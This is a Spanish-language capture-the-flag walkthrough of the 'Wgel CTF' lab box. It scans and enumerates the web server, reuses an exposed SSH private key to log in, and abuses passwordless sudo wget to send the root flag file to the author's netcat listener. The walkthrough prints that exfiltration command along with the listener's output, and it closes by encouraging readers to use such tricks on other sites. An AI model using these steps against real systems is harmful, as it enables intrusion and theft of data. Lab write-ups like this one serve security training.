# [Task 1] Wgel CTF 26/10/2019
Have fun with this easy box.
### Antes de nada scaneo
```
$ nmap -Pn -sT -p- -O -sC -sV -T5
```
<p>
Es scaner nos indica la existencia de dos puertos, 22 y 80. Abrimos navegador y nos vamos al servidor http. La conexión solo muestra la página de información de apache, pero si vemos el código fuente nos desvela la existencia del comentario:
<p>
 
```
!-- Jessie don't forget to udate the webiste -->
```

<p>
Pasamos a enumerar las páginas:
<p>
 
```
gobuster dir -u http://IP/ -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt -q
```
<p>
Nos quedamos con el directorio sitemap y volvemos a enumerar.
<p>
 
 ```
gobuster dir -u http://IP/sitemap -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt -q 
 ```

<p>
Esta vez nos hemos encontrado con un directorio muy interesante  **/.ssh** Cuando nos conectamos a esa página vemos el fichero con la clave privada de ssh. Dado que sólo tenemos un usuario, probamos a conectarnos vía ssh al server. Antes de nada hay que cambiar los permisos al fichero.
 
 ```
 $ chmod 600 id_rsa
 $ ssh -i ./id_rsa jessie@ip
 ```
 Pasen, están en su casa :D
 La primera bandera a buscar es la de user_flag.txt, la cual está ubicada en .... home de ese user.
 
 La siguiente bandera es la de root. Lo primero de todo es saber lo que se puede hacer con ese usuario, 
 
 ```
 $ sudo -l -l
 
```
Podemos ejecutar /usr/bin/wget sin meter la clave. Pues adelante.
Para obtener el fichero root_flag.txt, abrimos un puerto en mi máguina local con un netcat y hacemos un post del fichero root a mi máquina.

```
En local
$ nc -lvnp 1234

En el server
sudo /usr/bin/wget --post-file=/root/root_flag.txt IP_Local:port

En local
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.183.40.
Ncat: Connection from 10.10.183.40:43980.
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.8.13.25:1234
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1xxxxxxxxxxxxxxxxxxxxxxxxxxxxx3d

```

ya tenmeos la flag de root.
 
### #1	User flag<p>
### Solución:

```Answer format: 05****************************f6```


### #2	Root flag<p>
### Solucion: 

```Answer format: b1****************************3d```

Este tipo de cosas tan simples te ayudan a entrar en un sin fin de sitios. Pasa no tengas miedo, hasta la cocina. Enjoy.
